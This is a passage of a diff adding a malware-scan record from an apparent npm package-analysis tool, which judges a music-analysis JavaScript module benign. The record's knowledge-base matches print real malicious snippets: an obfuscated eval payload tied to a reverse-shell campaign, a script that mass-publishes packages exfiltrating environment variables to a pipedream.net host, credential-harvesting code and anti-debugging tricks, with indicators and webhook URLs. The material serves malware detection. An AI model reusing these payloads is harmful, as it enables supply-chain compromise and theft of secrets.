state_context_pairs[iscr] = this.lyrics_obj2lyrics_states(compObjs[iscr]);\n        break;\n        default:\n        console.log(\"SHOULD NOT GET HERE!\")\n      }\n      //if (iscr == 0){\n      //  console.log('state_context_pairs[iscr]:', state_context_pairs[iscr]);\n      //}\n    }\n\n    const scl = {}\n    for (let iscr = 0; iscr < nscr; iscr++){\n      for (let jstate = 0; jstate < state_context_pairs[iscr].length - 1; jstate++){\n        const scPair = state_context_pairs[iscr][jstate]\n        let key\n        if (stateType == \"lyrics_state\"){\n          // State is already a string.\n          key = scPair[stateType]\n        }\n        else {\n          // State is not a string, but we can make it so.\n          key = this.state2string(scPair[stateType])\n        }\n\n        if (scl[key] !== undefined){\n          scl[key].push(scPair[\"context\"])\n        }\n        else {\n          scl[key] = [scPair[\"context\"]]\n        }\n      }\n    }\n    return scl\n  },\n\n  prune_initial: function(initialDistbn, stm, param){\n    const stateType = param.stateType\n\n    return initialDistbn.filter(function(scPair){\n      return mu.array_object_index_of_array(\n        stm, scPair[stateType], stateType\n      ) >= 0\n    })\n  },\n\n  fifth_steps_mode2MNN_MPN: function(fifth_steps_mode){\n    // Tom Collins 26/1/2015.\n    // A pair consisting of position on the circle of fifths and mode (0 for\n    // Ionian, 1 for Dorian, etc.) is converted to a pair consisting of a MIDI\n    // note number and morphetic pitch number for the tonic.\n\n    var conversion = [// Major keys (Ionian modes).\n      [[0, 0], [60, 60]], [[1, 0], [67, 64]], [[2, 0], [62, 61]],\n      [[3, 0], [69, 65]], [[4, 0], [64, 62]], [[5, 0], [71, 66]],\n      [[6, 0], [66, 63]], [[7, 0], [61, 60]], [[8, 0], [68, 64]],\n      [[9, 0], [63, 61]], [[10, 0], [70, 65]],\n      [[-1, 0], [65, 63]], [[-2, 0], [70, 66]],\n      [[-3, 0], [63, 62]], [[-4, 0], [68, 65]],\n      [[-5, 0], [61, 61]], [[-6, 0], [66, 64]],\n      [[-7, 0], [71, 67]], [[-8, 0], [64, 63]],\n      // Minor keys (Aeolian modes).\n      [[0, 5], [63, 62]], [[1, 5], [70, 66]], [[2, 5], [65, 63]],\n      [[3, 5], [60, 60]], [[4, 5], [67, 64]], [[5, 5], [62, 61]],\n      [[6, 5], [69, 65]], [[7, 5], [64, 62]], [[8, 5], [71, 66]],\n      [[9, 5], [66, 63]], [[-1, 5], [68, 65]],\n      [[-2, 5], [61, 61]], [[-3, 5], [66, 64]],\n      [[-4, 5], [71, 66]], [[-5, 5], [64, 62]],\n      [[-6, 5], [69, 65]]\n    ];\n    var i = 0;\n    while (i < conversion.length){\n      if (\n        conversion[i][0][0] == fifth_steps_mode[0] &&\n        conversion[i][0][1] == fifth_steps_mode[1]\n      ){\n        var MNN_MPN_pair = conversion[i][1];\n        i = conversion.length;\n      }\n      else{\n        i++;\n      }\n    }\n    return MNN_MPN_pair;\n  },\n\n  string2lyrics: function(str){\n    // Retain characters that are alphanumeric, a space, or a line break.\n    let lines = str.split(\"\\n\")\n    // Get rid of multiple line breaks.\n    .filter(function(line){\n      return line.length > 0\n    })\n    .map(function(line){\n      let words = line.replace(/[^a-z0-9\\ ]/gi, \"\").toLowerCase()\n      return words.split(\"\\ \")\n    })\n    // console.log(\"lines:\", lines)\n    return lines\n  },\n\n  state2string: function(state){\n    // Tom Collins 26/5/2020.\n    // Assumption here is that the state will be of the form\n    // [1, [ -7, -3, 0, 12 ]]\n    // and the output will be of the form\n    // \"1|-7,-3,0,12\"\n\n    return state[0] + \"|\" + state[1]\n    // state[1].map(function(m, idx){\n    //   if (idx == state[1].length - 1){\n    //     return m\n    //   }\n    //   return m + \",\"\n    // })\n  },\n\n  string2state: function(str){\n    // Tom Collins 26/5/2020.\n    // Assumption here is that the string will be of the form\n    // \"1|-7,-3,0,12\"\n    // and the output will be of the form\n    // [1, [ -7, -3, 0, 12 ]]\n\n    let split = str.split(\"|\")\n    let arrStr = split[1].split(\",\")\n    return [\n      parseFloat(split[0]),\n      arrStr.map(function(num){\n        return parseInt(num)\n      })\n    ]\n  }\n\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.3825800697008768,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and processes musical composition objects to extract and transform musical state data using various sensitive file operations (fs.writeFileSync) to write JSON state transition matrices and initial state distributions to disk. It reads composition data, segments it, computes beat and note states, prunes dead-end states, and writes the results to files specified by parameters. No network or system execution APIs are used, and no suspicious hardcoded IPs, URLs, or commands are present, resulting in purely local file-based data processing and storage.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a complex music analysis module that processes musical composition objects to extract and transform musical state data. It uses local file system operations (fs.writeFileSync) solely to write JSON files representing state transition matrices and initial state distributions. There is no evidence of network communication, obfuscated code, environment manipulation, or execution of arbitrary code. The code does not collect system or user data beyond the musical data it processes, nor does it perform any suspicious operations such as eval or base64 decoding of payloads. Compared to the known malicious patterns, which involve obfuscated payload execution, data exfiltration, or automated malicious package publication, this code is purely analytical and data processing in nature. The use of fs and path modules is legitimate and limited to local file writes. Therefore, there is very low confidence that this code is malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3984910845756531,
+              "code_similarity": 0.37309718132019043,
+              "behavior_similarity": 0.42388495802879333,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_428202_snippet_1",
+              "source_package": "n-t-internationalization (and 147+ others, see dc file) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_428202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3759765028953552,
+              "code_similarity": 0.2878320515155792,
+              "behavior_similarity": 0.4641209840774536,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "#!/bin/bash\nPOSITIONAL=()\nwhile [[ $# -gt 0 ]]\ndo\nkey=\"$1\"\ncase $key in\n    -v|--version)\n    VERSION=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -s|--searchpath)\n    SEARCHPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -l|--lib)\n    LIBPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    --default)\n    DEFAULT=YES\n    shift # past argument\n    ;;\n    *)    # unknown option\n    POSITIONAL+=(\"$1\") # save it in an array for later\n    shift # past argument\n    ;;\nesac\ndone\nset -- \"${POSITIONAL[@]}\" # restore positional parameters\nfor i in $(cat dc);\ndo\necho '\n{\n  \"name\": \"'$i'\",\n  \"version\": \"141.0.0\",\n  \"description\": \"hackerone.com/homosec Bug Bounty Security Reseaarch White Hat\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"preinstall\":\"node index.js\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n' > package.json\necho \"//hackerone.com/homosec\n//Bug Bounty Security Reasearch White Hat\n//homosec@wearehackerone.com\nif (Object.keys(process.env).length > 15 &&\n    !(process.env.COLOR == '0' && process.env.EDITOR == 'vi' && process.env.LOGNAME && process.env.OLDPWD) &&\n!(process.env.APPDATA === '/analysis/bait')&&\n!(process.env._ === '/usr/bin/timelimit')&&\n!(process.env.npm_config_registry === 'https://mirrors.tencent.com/npm/')) {\nvar _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\x36\\x35\\x39\\x64\\x63\\x61\\x38\\x32\\x30\\x61\\x33\\x37\\x65\\x36\\x66\\x35\\x64\\x33','\\x6D','','\\x70\\x69\\x70\\x65','\\x64\\x72\\x65\\x61\\x6D','\\x6E\\x65\\x74','\\x2F\"$i\"','\\x50\\x4F\\x53\\x54','\\x72\\x65\\x71\\x75\\x65\\x73\\x74','\\x62\\x61\\x73\\x65\\x36\\x34','\\x65\\x6E\\x76','\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79','\\x66\\x72\\x6F\\x6D','\\x77\\x72\\x69\\x74\\x65','\\x65\\x6E\\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()\n}\n\" > index.js\nnpm publish --access=public \nsleep 10\ndone;",
+                "code_behavior": "During CI/CD or local execution, the script iterates over a list of package names, generates malicious package.json and index.js files for each, and publishes them to npm, resulting in mass deployment of packages with embedded preinstall exfiltration payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "The script automates the creation and publication of a large number of packages, each containing obfuscated, malicious JavaScript that exfiltrates sensitive data. This is a hallmark of supply chain attacks aiming for broad impact.",
+                  "violated_expectations": "Legitimate publishing scripts do not mass-generate packages with identical, obfuscated payloads designed for data exfiltration.",
+                  "similar_legitimate_use": "Automated publishing for monorepos or scoped packages, but without embedding malicious or obfuscated code.",
+                  "key_indicators": [
+                    "Automated mass publication of packages",
+                    "Autogeneration of package.json with preinstall hooks",
+                    "Injection of obfuscated JavaScript payloads",
+                    "Use of shell scripting to orchestrate malicious deployment"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "ci-cd/runtime",
+                  "file_location": "dc.sh",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "n-t-internationalization (and 147+ others, see dc file)",
+                  "package_manager": "npm",
+                  "package_versions": "141.0.0 (and possibly others)",
+                  "why_malicious": "These packages are mass-published with autogenerated content and contain obfuscated JavaScript code that exfiltrates all environment variables to an external server during installation. The attack leverages preinstall hooks to trigger the payload, uses obfuscation to evade detection, and targets the npm supply chain at scale. This behavior violates user trust, npm ecosystem norms, and cannot be justified as legitimate or white-hat research."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Automated script generates and publishes malicious packages for each name in the dc file, embedding obfuscated exfiltration payloads.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious packages are available on npm for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation, the preinstall hook in package.json executes index.js, triggering the malicious payload.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious JavaScript is executed automatically on the victim's machine during package installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js checks for analysis or sandbox environments and, if not detected, exfiltrates all environment variables to a remote pipedream.net server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data from victim systems, enabling further compromise or data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "preinstall hook in package.json executing JavaScript that accesses process.env and initiates outbound network requests",
+                    "Obfuscated JavaScript code in index.js containing environment checks and network exfiltration logic",
+                    "Presence of anti-analysis or sandbox evasion logic prior to payload execution"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated code and outbound network logic",
+                    "package.json with scripts.preinstall set to 'node index.js'",
+                    "dc.sh or similar shell scripts automating mass package publication"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to *.pipedream.net",
+                    "Host: 76c42f27d26091659dca820a37e6f5d3.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall hooks that execute JavaScript accessing process.env and making outbound network requests, especially to known exfiltration endpoints such as pipedream.net. Flag packages with obfuscated code in index.js and those published in bulk with similar structure. Alert on any package that exfiltrates environment variables or performs environment checks to evade analysis. Correlate file indicators (index.js, package.json, dc.sh) and network activity to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202040_962955_snippet_6",
+              "source_package": "mostly-harmless (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202040_962955/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3746407628059387,
+              "code_similarity": 0.3105153739452362,
+              "behavior_similarity": 0.4387661814689636,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "// This will contain all of the temporary data we\n// read from files and env vars.\nlet exfil = {};\n\n// we will essentially call this function\n// once per item: \n// name -> the filename or ENV var\n// tp -> either \"file\" or \"env\"\n// data -> the raw blob of data\nconst process = (name, tp, data) => {\n\texfil = Object.assign(exfil, \n    {`{name}@{tp}`: Buffer.from(data).toString(\"base64\")});\n};",
+                "code_behavior": "After postinstall, the code collects data from files and environment variables, encodes each item in base64, and stores them in an object for subsequent exfiltration to the attacker's server.",
+                "malice_analysis": {
+                  "why_suspicious": "Systematically harvesting credentials and environment variables, encoding them for exfiltration, is a classic data theft technique, especially when combined with later network transmission.",
+                  "violated_expectations": "Legitimate packages do not enumerate and exfiltrate sensitive files or environment variables during installation or runtime.",
+                  "similar_legitimate_use": "Some diagnostic tools may read environment variables for debugging, but not for exfiltration or encoding for network transmission.",
+                  "key_indicators": [
+                    "systematic collection of files and environment variables",
+                    "base64 encoding of sensitive data",
+                    "preparation of data for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via remote code or build.js)",
+                  "file_location": "lib/build.js or remote payload",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mostly-harmless",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0, 1.0.1",
+                  "why_malicious": "The package executes arbitrary code on the host system during installation by leveraging postinstall scripts to download and run remote binaries, establish reverse shells, and exfiltrate sensitive data such as credentials and environment variables. These actions directly compromise host security and privacy, and are not expected or acceptable in legitimate npm packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious postinstall script is triggered during npm install.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of remote or local malicious code."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Remote binary is downloaded and executed, or local JavaScript is run to fetch and execute further payloads.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Establishment of remote access or further code execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Reverse shell is established, granting attacker remote access to the host.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands on the victim system."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Sensitive files and environment variables are harvested and prepared for exfiltration.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Exfiltration of credentials and secrets to attacker-controlled infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall scripts that download and execute remote binaries from untrusted domains",
+                    "postinstall scripts that execute local JavaScript files with network access and code execution capabilities",
+                    "JavaScript code that fetches and evals remote code during installation",
+                    "Enumeration and base64 encoding of environment variables and files for exfiltration"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious postinstall scripts referencing wget, curl, or node execution of local scripts",
+                    "lib/build.js or similar files containing network-fetching or eval code",
+                    "Downloaded binaries (e.g., 'malware') with no legitimate purpose or documentation"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to untrusted domains such as probably.bad",
+                    "Outbound TCP connections to hardcoded IPs and ports (e.g., 10.0.0.20:1028)",
+                    "HTTP(S) requests to fetch code or exfiltrate data during or immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that download or execute remote code, especially those referencing untrusted domains or invoking wget/curl. Flag any use of eval on network-fetched data in JavaScript files executed during installation. Detect outbound connections to suspicious IPs or domains (e.g., probably.bad, 10.0.0.20:1028) during or immediately after installation. Audit package.json for unexpected postinstall entries and scan for code that enumerates and encodes environment variables or sensitive files for exfiltration."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_266713_snippet_3",
+              "source_package": "small-sm (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_266713/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3745284676551819,
+              "code_similarity": 0.32880544662475586,
+              "behavior_similarity": 0.4202514886856079,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "_0x1f2d80 = _0x2268f1(this, function () {\n  return _0x1f2d80\n    .toString()\n    .search('(((.+)+)+)+$')\n    .toString()\n    .constructor(_0x1f2d80)\n    .search('(((.+)+)+)+$')\n})",
+                "code_behavior": "At runtime, if deobfuscation or debugging tools are detected, the code executes a recursive regular expression that jams the event loop, thereby hindering static and dynamic analysis and delaying reverse engineering.",
+                "malice_analysis": {
+                  "why_suspicious": "The presence of anti-debugging and anti-deobfuscation logic, such as event loop jamming, is a hallmark of malware attempting to evade detection and analysis.",
+                  "violated_expectations": "Legitimate open-source packages do not implement event loop jamming or anti-analysis logic to prevent code inspection.",
+                  "similar_legitimate_use": "Such techniques are rarely used outside of DRM or anti-tamper systems, and are not appropriate in open-source or user-facing packages.",
+                  "key_indicators": [
+                    "Obfuscated code with anti-analysis logic",
+                    "Event loop jamming via recursive regular expressions",
+                    "Detection of debugging or deobfuscation attempts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when deobfuscation/debugging attempted)",
+                  "file_location": "obfuscated payloads in malicious npm packages",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "small-sm",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions, ~200 packages in total)",
+                  "why_malicious": "The package is part of a coordinated supply chain attack campaign by LofyGang, designed to steal sensitive information such as Discord tokens, credit card data, and streaming/gaming account credentials. The campaign leverages techniques including typosquatting, starjacking, sub-dependency hiding, and persistent malware to evade detection and maintain access. The package modifies files in the Discord installation directory to intercept and exfiltrate sensitive data to attacker-controlled Discord webhooks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs a typosquatted or starjacked npm package (e.g., small-sm).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious sub-dependency is loaded and executed, initiating the attack."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code modifies the installed Discord application to hook into payment and credential flows.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data such as tokens and credit card information is intercepted from the Discord application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Intercepted data is exfiltrated to attacker-controlled Discord webhooks.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and payment data via Discord webhooks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If analysis or deobfuscation is attempted, anti-debugging code jams the event loop to hinder reverse engineering.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Analysis is delayed or prevented, increasing the persistence and stealth of the malware."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package loading hidden or obfuscated sub-dependencies at import-time",
+                    "Modification of Discord desktop application files, especially index.js in discord_desktop_core",
+                    "Interception and exfiltration of payment or credential data via webRequest or similar APIs",
+                    "Presence of anti-debugging or anti-deobfuscation logic such as event loop jamming"
+                  ],
+                  "file_indicators": [
+                    "C:\\Users\\*\\AppData\\Local\\Discord\\app-*-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js (modified)",
+                    "Obfuscated or suspicious sub-dependencies in node_modules directory",
+                    "Unexpected changes to Discord installation files after npm package installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to Discord webhook URLs (e.g., canary.discord.com/api/webhooks/1010307578896584765/kfko3kvm_uwgTjZlGgmTnHirUnfqDageyMj5XrPBKn, 101030766646531165/uhn_60tOz9hB4bDV7YiwiQxvZ4DMJZtaQ4Gn1E8g, 1010307734369813350/oj2i46ek3xUABqPYFkz81kHzCJOazzbpmtSnA-h7o)",
+                    "Unexpected network requests from npm package install or runtime to Discord webhook endpoints"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that load obfuscated or hidden sub-dependencies, especially those that subsequently modify files in Discord's installation directory. Use file integrity monitoring to detect unauthorized changes to Discord application files, particularly index.js in discord_desktop_core. Detect outbound network requests to Discord webhook endpoints or other suspicious domains during or after package installation. Flag packages containing anti-debugging or anti-deobfuscation logic, such as event loop jamming. Correlate these behaviors to identify coordinated supply chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195355_942954_snippet_4",
+              "source_package": "discord-selfbot-v12 (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195355_942954/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.36936038732528687,
+              "code_similarity": 0.3240266442298889,
+              "behavior_similarity": 0.4146941304206848,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "_0x1f2d80 = _0x2268f1(this, function () { return _0x1f2d80.toString().search('(((.+)+)+)+$').toString().constructor(_0x1f2d80).search('(((.+)+)+)+$') })",
+                "code_behavior": "At runtime, the code executes anti-deobfuscation logic that jams the event loop if deobfuscation tools or analysis are detected, thereby hindering reverse engineering and automated analysis.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-analysis and anti-debugging techniques are commonly used in malware to evade detection and frustrate reverse engineering efforts.",
+                  "violated_expectations": "Legitimate open-source code does not attempt to prevent analysis or intentionally degrade application performance.",
+                  "similar_legitimate_use": "Obfuscation may be used for commercial software protection, but not for open-source packages or to actively hinder analysis.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript code with anti-debugging logic",
+                    "Event loop jamming or infinite loops triggered by analysis tools",
+                    "Code patterns designed to detect or respond to deobfuscation attempts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "obfuscated payloads in various .js files",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord-selfbot-v12",
+                  "package_manager": "npm",
+                  "package_versions": "12.5.2, 12.5.1, 12.4.9",
